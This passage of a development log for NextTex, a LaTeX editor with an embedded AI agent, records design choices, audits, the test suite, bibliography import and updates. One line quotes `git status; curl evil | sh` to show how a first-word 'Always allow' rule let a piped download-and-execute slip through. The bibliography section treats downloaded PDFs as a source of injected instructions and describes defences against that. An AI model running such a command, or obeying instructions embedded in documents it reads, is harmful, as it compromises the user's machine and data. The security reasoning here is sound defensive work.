prompt only when a voice summary exists, so nobody pays for it who has not
uploaded a sample.


## 12. Version history, a trash, and completion

Added at the writer's request, after the second audit. Three of these are
new surfaces; the rest are corrections to old ones.

**History is browsed inside the editor.** A 264 px panel overlays the right
edge of the editor pane: an overlay rather than a fourth column, so opening
history does not reflow the preview and lose the reader's place in the PDF.
Versions are grouped by day, because "some time on Tuesday" is how people
remember losing a paragraph, and each row carries the time, who made it, the
reason or the label, and the size. Selecting one puts the editor into a
read-only viewing mode with a 26 px banner at the top of the pane, inside the
editor rather than floating over it.

The one unacceptable failure in this feature is autosaving historical text
over the live file, and it is closed three independent ways: the historical
text is loaded into a state built from a *different extension set with no
update listener at all*, so no dispatch of any kind can arm a save;
`EditorState.readOnly` and `EditorView.editable` are the second and third
locks; and the live `EditorState` is never touched, which is also why undo
history and cursor come back intact rather than being saved and restored.

**Show changes** shades lines that are in the old version and not in the file
as it stands, using `--error` at 12 % with a 2 px inset bar. Error red rather
than a neutral wash on purpose: what you deleted is what you came looking
for.

**The trash is a section under the file tree**, appearing only when it holds
something. Deleting asks nothing, the file moves to the trash with its
history and the count goes up, because a confirmation before an action that
is one click from being undone is friction for nothing. Deleting *from* the
trash asks, in the app's own type, because that one is final.

**Autocomplete belongs to the project, not to LaTeX.** Citation keys carry
their author and year; labels carry the file they are defined in; the
writer's own `\newcommand` macros are offered before the built-in list and
marked `yours`. The popup is themed to the app, `--surface` on `--line`,
the selected row on `--hint-wash`, so it does not read as a stock editor
widget dropped into a designed application.

**Equation previews** render with KaTeX on hover, lazily imported so nobody
who never writes maths pays 260 KB for it, with the project's own macros
passed through as KaTeX macros. `\npistar` renders as the notation it stands
for rather than as an error.

**The mark.** A sheet of paper with its corner turned, notched on the left so
the negative space reads as a chevron, next. Hectograph violet on the tile,
paper white inside, drawn on a 32-unit grid and checked at 16 px. It is
inlined into the HTML as a `data:` favicon rather than served as a file,
because the server routes every unknown path to the app shell and a
`/logo.svg` would come back as HTML.


## 13. What the third audit changed

The new surfaces were audited against §§1–12 with real renders in both
themes. What it found, and what was done:

**The history panel now docks rather than overlays**, whenever the editor is
wider than 700 px. As an overlay it covered the right third of every wrapped
LaTeX line, so the file could not be read while the panel comparing it to its
past was open, which defeats the panel. Below that width it still overlays,
now on `--surface-2` so the plane change is legible without depending on a
hairline. It also keeps your place: entering a version anchors to the line
you were on rather than resetting to the top, because the old version is a
different length and a pixel offset would land somewhere else entirely.

**The banner is unmistakably not the tab bar.** It had been `--surface-2`,
the tab bar's own fill, directly above it, announcing the most consequential
state in the editor in the same colour as more toolbar. It now takes a
`--hint` top rule and a tinted fill, `--pen-wash` when the version is
Claude's. Escape leaves. Every path that closes the panel also leaves viewing
mode, which the status strip's toggle did not, and `Restore this`, the only
mutating action available in a read-only mode, confirms in place like every
other destructive action in the app.

**"Show what's gone" is a real diff.** It had been set membership: does this
line appear anywhere in the new text. LaTeX is full of repeated lines, so
deleting a figure block left `\centering` and `\end{figure}` unshaded and the
eye got a comb where it needed a block. It is now an LCS diff, and the label
says what it actually shows: the old version's deletions, since additions
since are invisible by construction. The 2 px error-coloured gutter bar is
gone: it was the same shape, colour and position as a diagnostic marker.

**One stray `$` no longer breaks every equation preview after it.** Dollar
pairing ran over the whole document, so a single unclosed delimiter, the
commonest LaTeX typo there is: inverted the pairing for everything below it:
hovering prose rendered maths, hovering maths rendered nothing. The scan is
now scoped to the paragraph under the pointer and says nothing when that
block is unbalanced, which is also what makes it cheap enough to run on every
pointer move.

**`.quiet` was silently repainting other elements' colours.** It is unlayered
and outweighs Tailwind's utilities, so `quiet … hover:text-error` on the
trash's Delete hovered to `--hint`, the colour that means *safe and
interactive*, and the preview's selected Fit width state was identical to
the unselected one. Tone is now carried by a `data-tone` attribute the class
respects.

**Smaller, all from the same pass:** one `--float` shadow token replaces three
hand-rolled recipes; the `main` tag lost its `--surface-3` chip, which was
under 4.5:1 in both themes and wore the pressed-state colour for a permanent
label; the trash reads like the file tree it hangs under, with 26 px rows,
stem/extension names and the same clock the history panel uses; `Create
project` is a ghost button, since the projects screen has no agent on it and
filled violet was the loudest thing on the page; the completion popup is
capped so it stops crossing into the preview, and is painted in `--surface-2`
like every other floating surface in the editor rather than in the page's own
`--surface`, which on a white ground left it held apart from what it floated
over by a hairline and a shadow alone; and the logo was redrawn with
one chevron instead of two two units apart, on an outlined tile: the old
mark fused into a violet smudge at 18 px, and a brand mark should not spend
the fill that means *answer the agent*.

## 14. Building the instruments, and what they found

The three audits above were done by reading code and looking at screenshots.
That is how every bug in them was found, and it is also why this section
exists: fourteen thousand lines of source were covered by nine hundred lines
of test, all of them unit tests over `nexttex/`. **Not one HTTP route was
tested, no frontend code was tested at all, and every browser check had been
a throwaway script in `/tmp`.**

Writing the plan proved the cost. Reading the app against a coverage map
turned up three bugs that broke a feature outright: changing the model
raised a 500, the sign-in screen never advanced after a successful login,
and the Console/SSO button was wired to a parameter the server does not
read. None would have survived a suite. Adversarial reading of the same code
found a dozen more, and the suite itself found several the reading missed.

### What was built

**A scripted agent.** `ProjectAgent` spawns the real `claude` CLI: slow,
costly, non-deterministic, and it needs an account. So a large part of the
app, streamed prose, edit chips with their diffs and undo, permission cards
and their shield, the follow-up queue, usage, model switching, was
untestable. `nexttex/scripted_agent.py` replays a list of steps from
`tests/scripts/*.json` through the same event queue the real one writes to.
An `edit` step performs a real write, so the version, the rebuild, the chip
and the undo all run for real; a `permission` step really does block until
somebody answers. A browser test names the script in the first line of its
question: `#script:permission`.

It has one honest limitation, and it is the one the earlier reviewer warned
about: a stand-in cannot tell you whether the real SDK still emits the
message shapes the scripts assume. That is what the `NEXTTEX_LIVE` smoke
test is for, and it is run by hand.

**API contract tests.** Every route, its documented failures, and a path
escape assertion on everything that takes one. The fixture ordering is
load-bearing: `server/main.py` builds `SETTINGS` and `REGISTRY` at *import*
time and `Settings.load()` writes a config file when it finds none, so the
environment is redirected at conftest module scope, before anything under
`server` is imported. Otherwise running the tests hands a different token to
whatever tab is open.

**A browser tier.** Each spec starts a NextTex of its own, own port, own
XDG directories, own projects, a config written before the server so the
token is known rather than scraped from a log line, and drives it against
the Chromium actually cached on the machine rather than the build number the
library expects. Every wait is on an observable: a response, a DOM state,
never a clock. The exception is written down: one spec has to prove a build
*does not* happen while an equation is unbalanced, and a negative assertion
needs a clock.

That spec is worth a paragraph, because two versions of it passed while
testing nothing. The first counted `/compile` requests -- but an ordinary
save carries `compile: true` in its own body, so the server starts the build
itself and no such request is ever made; the count stayed at zero whatever
the app did. The second watched the status dot, which does say "Compiling"
-- for the 130 milliseconds a build of a short document takes, which a poll
cannot be relied on to catch. Both passed with the debounce deliberately
disabled. The third subscribes to the event stream from the test process and
counts `compile_start`, which is the thing actually being asserted, and it
fails when the debounce is removed. The same helper is there for any spec
that needs to assert on something the page never displays.

The same rewrite turned up why the second version could not have worked
either: it clicked the editor and typed, which lands wherever the viewport
happens to be -- the preamble. `mid_construct` looks only between
`\begin{document}` and `\end{document}`, on purpose, so an unbalanced `$`
typed into the preamble is not unfinished work and never was. The spec now
puts the cursor in the body deliberately.

**A sign-in that is driven end to end.** The bug on that screen -- waiting
for an `exit` event that nothing published -- lived in the seam between a
real interactive program under a pseudo-terminal and a browser waiting on
its output. Both halves were individually correct, and a mock of either
would have had no seam to get wrong. So `tests/fake_claude.py` is a real
program, run under the real pseudo-terminal, through the real pump: it
prints a verification URL without a trailing newline the way the CLI does,
waits for a code on stdin, and reports itself signed in afterwards. The
server finds it through `NEXTTEX_CLAUDE_BINARY`, which is the whole of the
production change. Two tests then cover the flow, one over the API and one
in a browser, and both fail if the event is renamed on either side.

**Property tests** over the two places where being right for the cases
somebody thought of is not enough: the path fence, and what retention is
allowed to throw away.

**A hostile-input layer.** None of it is an attack. It is a figure with a
per cent sign in its name, a chapter pasted from Word, a project of two
thousand files, a directory that went read-only because something was
syncing it, a disk that filled up.

**Benchmarks**, on demand, against a project shaped like a thesis: forty
source files, two megabytes of LaTeX, a populated build directory, a `.git`
with a working tree. The thresholds are budgets, not records.

### The bugs that mattered

**Two windows on one project destroyed each other's work.** `PUT /file` was
whole-file last-writer-wins with nothing watching, and the watcher's own
"this was us" suppression meant the second tab was never even told a save
had happened, so its autosave wrote a stale buffer over everything the
first had written, silently, with the tab still showing clean. A save now
carries a tag for what the browser last agreed the file said, is refused
rather than believed when the file has moved on, and is broadcast to every
other tab. The refusal is a banner offering both copies.

That tag was got wrong twice before it was right. A float second was far too
coarse: saves land a quarter of a second apart, and any slack wide enough
to absorb filesystem differences was wide enough to wave the clobber
through. `st_mtime_ns` was better and still wrong: it is only as fine as the
filesystem chooses to record, and two writes a millisecond apart share one
on plenty of them. The test caught that by failing one run in three. It is a
hash of the contents now, which answers the real question anyway.

Closing the loop found one more: history collapses an editing burst into a
single version, and both windows are "you", so the tab that saved second
replaced the other tab's version and the text it had overwritten was gone
from the history as well as from the file. A burst now only collapses within
the window that made it.

**A server restart killed every open tab, silently.** Forty-two routes
required a project to be open, including the event stream, so after a
restart the browser retried a 404 every two seconds forever with nothing on
screen saying so. "Open" is what a user does to a window, not a
precondition the server keeps: `session_for` opens a registered project on
demand, and only the open route marks one as recently opened.

**The preview zooms with the wheel and with a pinch.** Ctrl with the wheel,
or two fingers on a trackpad, which every browser reports as a wheel event
with `ctrlKey` set. Two things make it more than ten lines. The listener has
to be a native, non-passive one: React registers `wheel` passively on its
root, so `preventDefault` inside `onWheel` is ignored and the browser zooms
the whole application instead of the document. And a gesture must not
relayout the document sixty times a second: each page is a canvas sized by
its container, so the handler resizes the containers, which rescales what is
already drawn at the right scroll extents, and the crisp redraw runs once,
140 ms after the gesture stops. The point under the pointer stays under the
pointer, and the range is the one the zoom buttons already offered.

**A file created through the API never appeared in the tree.** A save
broadcasts `structural: False` so that a keystroke burst in one window does
not cost every other window a full tree request. Creating a file went
through the same line, so the new name was not in any open tab's tree until
somebody reloaded the page -- the file existed, was being edited, and could
not be reached. The broadcast now says structural when the file was not
there before. Found by a browser spec written for something else entirely,
which is the argument for the tier.

**A reload lost your place.** Not a bug, and it read as one. NextTex now
comes back to the document with the same files open and the same one in
front, and leaving for the project list is remembered just as deliberately.

**Ctrl-F did nothing**, on the first press. `searchKeymap` was bound
without the `search()` extension that provides the panel, and CodeMirror
installs the missing field in the same transaction that asks to show it, so
the field never sees the effect. The second press worked. A LaTeX editor
with no find and replace, one line away from having it.

**"Always allow" was wider than it looked.** The rule was scoped to a Bash
command's first word, which is only honest for a command that has one:
`git status; curl evil | sh` starts with `git`, so `Bash:git` covered it for
good. A command carrying shell syntax now gets no rule at all, is asked
about every time, and the card does not offer to remember it.

**The compile was doing work three times over.** Every build fired
`/symbols`, `/words` and `/git`, a full project rescan, a `texcount`
subprocess and a `git status`: inline on the single event loop, every 1.6
seconds while somebody typed. During those, the server answered nothing at
all: no autosave, no streamed token, no PDF. The symbol cache was worse than
slow: its stamp walk counted `.pdf` files and skipped only `.git` and
`.nexttex`, so `build/main.pdf` moved the stamp on every compile and the
whole project was rescanned every time. The benchmark keeps a guard on
exactly that: if it comes back, `symbols.after_build_ms` goes from about one
millisecond to about twenty.

**Secondary text on the third surface was unreadable**, 4.22:1 in the light
theme and 4.33:1 in the dark, against a 4.5:1 requirement. This has now been
got wrong twice and caught by eye both times, which is not a method. The
palette is parsed out of `styles.css` and every pairing the app uses is
measured, in both themes, in under a second.

### What the accessibility pass changed

axe-core over six states in both themes found four things, all of them the
app's own markup rather than a library's.

The document was an ARIA textbox with no name, so the one region of this app
that holds the writing was announced as an unlabelled input. It has a name
now.

The file tabs claimed `role="tab"` without a `tablist` around them, and each
tab contained its own close button: a control inside a control, announced
as one thing and reached as two. The fix was not to add the missing role: an
ARIA tablist promises arrow-key navigation between tabs and a panel
associated with each one, and this strip has neither, so claiming it would
tell a screen reader something untrue. The tabs are a labelled group of
buttons, the close button is a sibling rather than a child, and the open
file is marked with `aria-current`.

One rule is consciously rejected and written into the spec with its reason:
`scrollable-region-focusable` wants CodeMirror's scroller to be focusable
itself, when the focusable editable region inside it *is* how a keyboard
reaches and scrolls the document. Satisfying it literally would add a tab
stop that goes nowhere.

Beyond axe there are four checks it cannot make: that Escape closes what it
opens, that the composer is reachable by tabbing out of the editor, and that
the permission card's three answers are real buttons with real names, the
one control in this app where a mistaken click runs a command.

### Where the line is

Worth its maintenance: anything that asserts a contract, anything that
guards a safety property, path escape, atomic write, undo refusal, the
permission fence, history permanence: anything that encodes a bug already
paid for, and the handful of browser specs that prove the core loop still
works end to end.

Not worth it: snapshot tests of rendered React, which fail on every
intentional design change and assert nothing about behaviour; a second
browser spec for a variation the first already covers; tests that assert an
exact duration rather than a budget; and anything a unit test can pin down.
Every timing constant in the browser tier is a reason to prefer the layer
below it.

---

## 15. Making files, and putting files in

Everything above assumed files arrive somehow. They did, by drag-and-drop onto a row, or
through a menu hanging off one, and the assumption held right up until somebody needed a
folder in a project that had one file in it.

The work in this section came from a design consult, and two of its decisions are worth
keeping the reasoning for.

**The file picker opens before the destination chooser.** The obvious order is to ask where
the files should go and then open the picker. It is wrong: it costs two deliberate steps
before a file has even been chosen, every single time, including the overwhelmingly common
case where the answer is the same folder as last time. Opening the picker first means the
chooser appears *already knowing the filenames*, so "where do these go" and "one of these
is already there" become one question on one surface, instead of a two-page wizard. It also
means the chooser can decline to appear at all, which is what it does for a drop onto a
folder with no collisions: the gesture named the destination, so there is nothing to ask.

**A replacement is `op="replace"`, not an edit.** This looks like bookkeeping and is the
thing that keeps the feature honest. History collapses same-author edits inside ninety
seconds, which is right for typing and catastrophic here: export a plot, notice the axes are
wrong, export again inside a minute, and the coalescer merges the two replacements: keeping
the intermediate and dropping the version that held the *original* figure, which is the one
version the whole feature exists for. The coalescing test requires `previous.op == "edit" ==
op`, so a distinct op closes it by construction rather than by a special case. It is
deliberately *not* permanent: thinning a year of nightly re-exports is correct, and a
version somebody names is already permanent by its label.

Underneath both: replacing a figure used to destroy it. The route recorded a version by
reading the file as UTF-8 inside a `try` that swallowed the `UnicodeDecodeError`, so it
worked for a chapter and silently did nothing for a PNG. The blob store had never had
trouble with arbitrary bytes, `content()`'s `errors="replace"` decode had, which is right
for showing an old draft in an editor and turns every invalid byte of an image into U+FFFD.
There is a `bytes_of` beside it now, a `raw=1` form of the blob route that serves a version
with its own media type, and a read-only pane for files the editor cannot hold, without
which a figure's history is unreachable, since the only route to any file's history is to
make it the active document.

**And an old version opens in that pane, not in the panel.** For a while it opened as a
180 px thumbnail inside a 264 px column, and a PDF figure did not open at all, because the
panel drew its preview from an `img`, so the one format figures are kept in precisely
because it scales was the one that could not be looked at. The pane takes the bytes it is
to show rather than deriving them from the path; the path still decides which viewer to
reach for and what to call the file, because a version of a PNG is a PNG. Which of the two
ways a version opens is therefore a question about the file rather than about the version:
a picture or a PDF goes to the pane, and what still opens in place is a version this
machine does not hold, which has nothing to show anywhere, and a file neither viewer can
draw, where the honest offer is the download.

Two bugs turned up while building it, both in code that predated it. Creating anything at
the project root put a naming input under *every* file in the project, each one stealing
focus from the last, and the blur that follows cancelled it, the row hosting the input
compared a file's parent to `""` instead of only ever hanging off a folder. And the folder
list's arrow keys collapsed the list, because selecting an option and confirming the choice
were the same callback; selection has to follow focus with the list still open, or the
keyboard path is one keystroke long and ends in the wrong place.

What was added beyond the ask, and why each earns its place: the project root became a drop
target, because dropping a file at the root was previously impossible; a file that lands in
a collapsed folder is now revealed, expanded and flashed, because from the writer's seat it
had otherwise not landed; typing in the tree jumps to a file, which is the reason there is
no filter box in a bar 240 px wide; `Move to…` reuses the same folder chooser and the rename
route, which already fenced both of its paths; and an image pasted onto the tree becomes a
figure with a dated name, because screenshot-to-figure is a loop somebody runs all
afternoon.

---

## 16. Three agents, one of which is none

The agent was Claude, and the app was built around it closely enough that
"which model" looked like a setting nobody would ever need. Two things
changed that. Not everybody has a Claude account. And more importantly: a
writer who does not want an AI anywhere near their manuscript is not a lapsed
user of this app, they are its core user with one panel switched off.

So there are three providers, and the third is `none`.

**The seam already existed.** `ScriptedAgent` had been standing in for the
whole agent since the test suite was built, which is a stronger claim than
it looks: it proved the rest of the app depends on exactly eleven members:
`ask`, `events`, `busy`, `idle_seconds`, `disconnect`, `interrupt`,
`current_why`, `resolve_permission`, `set_model`, `model`, `usage`. Adding a
second real provider was writing a fourth implementation of a contract that
had already been exercised, not carving a new abstraction out of coupled
code.

**The OpenAI one is narrower on purpose, and the narrowing is the safety.**
The Claude SDK offers Bash, so that agent has to fence it: a permission
card, a rule scoped to the command's first word, a refusal to remember
anything for a compound command. Here the tool list is ours to write, so
there is no shell on it: a writing agent has never needed one except to
run the build, which is a tool of its own. And every path a tool takes is
resolved against the project root, so there is no out-of-project write to
ask permission about. `resolve_permission` returns `False` and says why,
rather than keeping a card that would never appear.

*Since the backlog close-out it puts one card up: a script. The three
script tools are on its list, behind the same card the Claude agent
draws for the same script, and the control has three positions for it
too; §48 has the rule and the reason. Everything else on the list still
asks about nothing.*

It has never spoken to OpenAI. There is no account here, so the transport
is stubbed and everything above it runs for real. What that cannot tell you
is whether OpenAI still returns these shapes, which is the same honest
limit the Anthropic side has and the reason `NEXTTEX_LIVE` exists. *It
has spoken to a local server, since the backlog close-out: the Ollama on
the writer's machine, through `tests/test_openai_ollama.py` and by hand
in a real browser; the first real turn found that a local server's
stream, which declares no charset, was being read as ISO-8859-1, so an
x squared arrived as two wrong characters. It is read as UTF-8 now,
which is what an event stream is.*

**"None" removes the column rather than disabling it.** A greyed-out panel
down the right-hand side is a permanent advertisement for a decision the
writer already made. The editor and the preview take the width.

### The error pane had to grow up first

Switching the agent off exposed how much of the app's helpfulness was
routed through it. The error drawer showed what TeX said, and `Fix` wrote
that into the composer, which is no help at all to somebody with no
composer.

`nexttex/explain.py` is twenty-three rules over the errors that actually
happen, each with what it means and what to look for. `Missing $ inserted`
becomes *Maths outside maths mode* and *put the expression between dollar
signs, or write `\_` if you meant a literal underscore*.

The part worth defending is the summary strip. TeX cascades: one unclosed
brace produces a complaint from every paragraph after it, and the list in
the drawer is sorted with errors first, so a reader who works down it
spends the evening fixing consequences. The strip names the *first* error
in document order, nearly always the cause, and says plainly that the
rest usually follow from it. That is a sentence, not a feature, and it is
the most useful thing in the pane.

---

## 17. A folder of papers, and the citation that is never invented

Point NextTex at a directory of PDFs and it fills in the bibliography. The
rule that makes it worth having is the same rule that makes it hard: a
citation may never be composed from anything but a publisher's own record.

**Bulk import is where that rule is most tempting to soften.** A hundred
PDFs, ninety of them carrying a printed DOI, and a title search would
"probably" get the rest. It does not, and the refusals are written into the
design rather than left to the implementation: no DOI is guessed from a
title, no filename that looks close is trusted, and there is no *add all
suggestions* button, twelve individual clicks is the correct cost of
twelve papers that had no DOI printed in them.

**The safeguard that is not obvious.** A DOI printed on page one is
sometimes a DOI the paper *cites*. So after the record comes back, its
title is checked against the paper's own front matter, and a record that
does not describe the paper it was found in is refused. The check is folded
token containment rather than a substring or a similarity ratio, because
`pdftotext` hyphenates at line ends: `nitro-\nphenol` folds to `nitro
phenol` and a substring test would reject a paper that is unambiguously
right.

**Duplicates, at three scopes.** A DOI already in the file. The same file
content under two collections, caught by hashing the bytes before anything
is extracted, which is also what makes re-running the same folder cost
seconds. And, the one that would have been silently wrong, **citation keys
colliding inside a single run**: two papers by the same author in the same
year both become `Marcus1993`, and the second shadows the first in every
`\cite` without LaTeX complaining. The growing `.bib` text is threaded
through each lookup so the disambiguator sees the entry added a moment ago.

**Why this is not a `ProjectContext` document.** That mechanism copies the
bytes, lists every document in the system prompt on every turn, and exists
to distil things. All three are wrong for two hundred papers: the copy is
600 MB of duplication, the listing would be two hundred lines paid for on
every turn, and there is no useful distillation of a literature collection.
The operation you want is *search*. So the library indexes the text that
had to be extracted anyway and contributes a fixed four lines to the
prompt, whatever its size.

**The path fence is not involved, extended, or excepted.** `Project.resolve`
answers one question, can this client-supplied relative path escape the
project it names, and it keeps answering only that. A Zotero folder is not
in the project and never will be. What guards the browse route instead:
it is read-only, it returns folder names and PDF counts and never file
contents, it does not follow symlinks, and **no tool the agent can call
reaches it**. A PDF is a file the writer downloaded from the internet, and
a tool that turned "read this folder" into an argument the model chooses
would be a path from a downloaded paper to the writer's home directory.

For the same reason, what `search_library` returns is framed as quotation
rather than instruction, and snippets are capped so no long instruction
block survives intact.

**Run over a real folder at last, in the backlog close-out.** Fifty-four
tests had covered the pipeline with the network and `pdftotext` stubbed;
nothing had put it over real papers. Twenty-five files, nineteen of them
genuine open-access papers fetched from JOSS, eLife, PLOS ONE and arXiv,
six of them the decoys a downloads folder holds (a scan with no text
layer, a thesis chapter whose first page cites three DOIs, a truncated
download, a slide deck, a duplicate under another name, a text file with
a `.pdf` suffix), through the real `pdftotext` and the real Crossref.
Three things were wrong, each now a test over a page of `pdftotext` text
kept in `tests/fixtures/`. Crossref answered `429 Too Many Requests` after
ten papers, because two lookups per paper went out back to back with no
pause, and the rest of the folder was lost to it; a refusal that names a
wait is now waited out and asked again, up to three times, and once a
publisher has refused once the run keeps a second between lookups. PLOS
prints a DOI under every figure, `...pone.0012361.g001`, and a figure's
DOI was offered as a paper of its own; a figure's or a table's component
is stripped, since the paper is what it names. And eLife's typesetter
breaks its DOI line with zero-width spaces, which `pdftotext` keeps, so
`10.7554/eLife.110034` was "No DOI printed in it"; invisible characters
are removed before the DOI is looked for. On the second run every one of
the seventeen papers with a printed DOI was added, the chapter was
refused because the cited paper's title is not on its page, the two arXiv
preprints and the slides said "No DOI printed in it", the scan, the
truncated file and the text file said nothing could be read, and the
duplicate was counted once.

## 18. Two installs, updating from the page, and a size the reader chooses

Three things, and each one turned on a fact that had to be measured rather
than reasoned about.

### Why the interface size is a `zoom`

The type scale is fixed pixels and so is the geometry around it: `h-[28px]`
controls, `h-[26px]` rows, `w-[264px]` cards. Scaling only the type would put
21px text in a 28px control. So the interface size scales the whole
composition: `zoom` on `#root`, which is the parent of *every* view, including
the loading, sign-in and project-list screens that return before the editor
shell is ever built. One line covers all of them, with nothing threaded
through `App`.

Editor text is the opposite case and gets the opposite mechanism: one CSS
variable on `.cm-scroller`, with a **unitless** line height so it tracks the
size. A fixed `22px` under 21px text is unreadable. The gutter follows at the
ratio it had at the default.

**Weight is a second variable, and the page it is drawn on gets a vote.**
Dark type on a bright ground looks thinner than light type on a dark one at
the same weight, the ground bleeds into the strokes rather than the strokes
into the ground, so a monospace face set at 400 that is right in the dark is
spindly on white. `--nx-editor-weight-lift` is that compensation, and it is a
**palette** token (100 in `.nx-theme-light`, 0 in `.nx-theme-dark`) rather
than a rule keyed on the theme, for the same reason `--on-pen` is one: the
editor can be handed one palette while the app is in the other, and a rule
that asks the *root* what theme it is gets the wrong answer inside that. The
three papers inherit it by being applied together with `.nx-theme-light`. It
is the same move, in the same direction and for the same reason, as the
`--ink-3` lift the papers already make: a thing that is measurably identical
can still be perceptually lighter, and the palette is where that is
corrected.

Settings → Editor weight is the writer saying the compensation went too far
or not far enough. Three stops, and three is all there is room for: the face
is five static weights rather than a variable one, so the steps are 100 apart
or they are nothing; a light page spends one of them before the writer sees
it; and a control sequence is set 200 above the prose. So the top stop is
already 600 prose and a command at the 700 ceiling on a white page, and a
fourth at 600 would put 700 prose there: a face with its counters filling
in, under a command that can no longer outweigh it. 300/400/500 reaches
300–600 for prose and 500–700 for a command, and that is the whole of the
usable range.

Two consequences worth stating. The stops are **named**, Lighter, Normal,
Bolder: rather than numbered, like the preview quality's and unlike the two
size rows above them: "Regular" would be a lie on four of the six editor
grounds, where the palette has already added a step. And the command weight
had to stop being a hard-coded 600, in the `.nx-syn-*` rules and in
`latexHighlight` alike, because the prose can now reach 600 itself: on a white
page at the heaviest setting the source would have gone flat, and the subtle
mode has nothing but weight to tell a command from a word.

**`zoom` leaves the app straddling two coordinate spaces, and the two halves
are not symmetrical.** Measured in Chrome at 150% rather than assumed:

- **Reads are in viewport pixels.** `getBoundingClientRect()` on an element
  inside the zoomed subtree returns 900 for something whose own `left` is
  600px. `MouseEvent.clientX` and `window.innerWidth` agree with it, so reads
  can safely be compared with one another.
- **Writes are in zoomed pixels.** `style.left = "600px"` on a fixed element
  inside the subtree renders at viewport 900.

So the bug is never in the reading. It is in taking something read and either
writing it back as a style, or comparing it against a literal from the
stylesheet, both of which live in zoomed space. `viewport.ts` holds the
conversion; eight sites use it. The rule for new code: **convert once, at
capture**, so anything stored in state is already in the space a style is read
in. Converting again at the point of use double-counts, which is exactly the
bug that arises when the capture and the use are in different files.

Two consequences that are easy to miss:

- The preview would have gone soft. Its canvas is sized from
  `devicePixelRatio`, which `zoom` does not change, and *nothing invalidated
  it*, a scale change is not a relayout. The resolution is read per render
  and an appearance event marks the pages stale.
- Container queries need no help. `Status.tsx` and the `@[208px]:` rules in
  `Chat.tsx` measure their container in its own scaled space, so a larger
  interface drops optional segments sooner. That is correct: bigger text does
  leave less room.

Ctrl-wheel over the editor steps the text size, mirroring the preview's own
gesture, and, like it, the listener must be native, because React registers
`wheel` passively and `preventDefault` inside `onWheel` is ignored. There are
deliberately **no** Ctrl-plus/minus bindings: the browser owns those, they are
what a reader reaches for first, and browser zoom already scales this app
correctly. Taking the keys away to do a worse version of what they already do
is a net loss.

Theme, interface size and editor size live behind one button in the rail
header. The theme costs a second click; in exchange the related controls fit a
32px header at its narrowest width. The trigger was `Aa` while the surface held
three typographic controls, and is a cog now that the same surface also decides
whether the document compiles as you type: a cog is what people look for when
the thing they want is not on screen anywhere else. Neither is the sun and moon
that came before both, because that glyph already means *switch the theme*, and
making it open a menu instead would break a meaning the app had taught.

What it opens is a sheet rather than a popover. Thirteen rows in a 248 px column
is a preferences window pretending to be a menu, and the length was the smaller
half of the problem: rows answering to entirely different things, how this
machine looks, how this project builds, who may open this install: sat in one
undifferentiated stack, and nothing said which of those travelled with the
project. It is two columns of named groups now, each with the subtitle it
needed, and "Kept in the project, not on this computer" is the sentence that
had nowhere to live.

### Which commits count as an update

NextTex is always a git checkout, no package, no version string, so "is
there an update" is a question about `git`. The interesting half is the second
question. Most commits to a project like this one change documentation or
tests, and telling somebody every session that three commits exist when none
of them changes the program they are running is a nag rather than a service.

Every commit is classified by the paths it touches: `frontend/` is
*interface*; `docs/`, `README.md`, `LICENSE`, `tests/`, `e2e/`, `bench/` and
`examples/` are *neither*; everything else, **including anything
unrecognised**, is *app*. Failing towards "something changed" is the right
direction: a wrong "nothing to see here" costs more than a wrong alarm.
`scripts/` counts as app because it changes what the *next* update does.

The label and the rebuild question are **separate fields**, which was learned
the hard way. Reading "does the bundle need rebuilding" off the single label
meant a commit touching a Python module *and* a React component came back
"app" with `rebuild` false: new server code installed behind the interface
that was already built, which is the exact failure the check exists to
prevent.

The screen fires the check after it has rendered and never awaits it, and the
fetch gets a ten-second timeout of its own rather than the module's 120: a
fetch with no route to the network would otherwise hang for two minutes on the
screen the writer opens every session. A check nobody asked for is silent when
it fails; an install on an offline tailnet must not open onto a red line every
morning.

**Asked and unasked are two different questions, and setting an update aside
only answers one of them.** `Not now` writes `head:behind` into this browser's
storage and the card stops appearing, which is right for the check that runs
when the screen opens and was wrong for everything else. The test was applied to
the render rather than to the check, so it also swallowed every result the
writer had pressed a button for: the request went out, the server answered past
its own cache, and the answer was discarded on the way to the screen. The button
visibly did nothing, and since the key only moves when upstream gains a commit,
it went on doing nothing. The dismissal is scoped to an unasked check now, which
is the same distinction the failure path four lines above it already makes.

**And the line it leaves says what it knows.** It used to read `Check for
updates`, which is indistinguishable from never having checked. An update put
off until a quieter afternoon has to leave something on screen to come back to,
so the dismissed state reads *"An update is waiting."* with a `Show it` beside
it: `--ink-3` at `micro`, the same grey line the docs-only case uses, which is a
fact rather than an alarm. `Not now` keeps the report rather than discarding it,
which is what lets that line exist, and marks it unasked, so a dismissal and a
reload arrive at the same branch by construction rather than by coincidence.

### Restarting, and why it is a nonce

`serve()` keeps its `uvicorn.Server` objects as locals and `main.py` holds no
reference to them, so **no route can ask for a graceful shutdown**. The exit
*is* the restart: systemd's `Restart=on-failure` and launchd's
`KeepAlive.SuccessfulExit=false` both bring a service back after a non-zero
exit and leave it down after a clean one. Windows registers a logon task,
which is not a supervisor: a task that ends stays ended. For a long time the
writer there was told to start it again, which for a server the task had
started meant finding Task Scheduler. Now the server arranges its own return
before it leaves: a hidden PowerShell helper, started out of the task's job
so it outlives the exit, waits for the pid to go and starts the task again,
or the Startup shortcut, or the same command line. It writes each step to
`restart.log` beside `server.log`, one line per step and a line for a
failure, so a restart that did not happen is a helper that can be asked.
Supervision is detected from `INVOCATION_ID` or `XPC_SERVICE_NAME`, and on
Windows from PowerShell being there, which it always is.

The page then polls for a **boot nonce**, regenerated once per process, not
for the commit sha. The question being asked is "did a different process
answer", not "did the code change": an update that pulls nothing still
restarts, and waiting for a sha that never moves would time out for no reason.
A tab that *joins* a running update starts that poll immediately rather than
waiting for the stream to end, because the stream replays the output collected
so far but not the `done` event, a tab arriving after the job finished would
otherwise wait for a message that has already been and gone.

**An inherent property worth knowing: the code that performs an update is the
old code.** A bug in the updater is therefore only fixed one update later.
That is not a design choice and cannot be avoided; it is a reason to keep this
path small and to test it against a real service, which the browser tier
cannot do: it spawns the server itself, with no supervisor, so a non-zero
exit simply kills it.

### Two installs on one machine

One environment variable, `NEXTTEX_INSTANCE`. Unset is the ordinary install
and nothing changes. Set, it moves the state directory aside
(`~/.local/share/nexttex-dev`), names the service `nexttex-dev`, and derives a
default port from the name, because two NextTex both defaulting to 8450 means
the second refuses to start with a message about a port rather than about what
the person was doing. The name is validated as a single path segment: it is a
label, never a way out of the directory.

A named instance carries a badge in the rail, on the project list and in the
tab title, in `--warn` rather than the accent, because it is a caution rather
than a feature. The ordinary install shows nothing: almost every install is
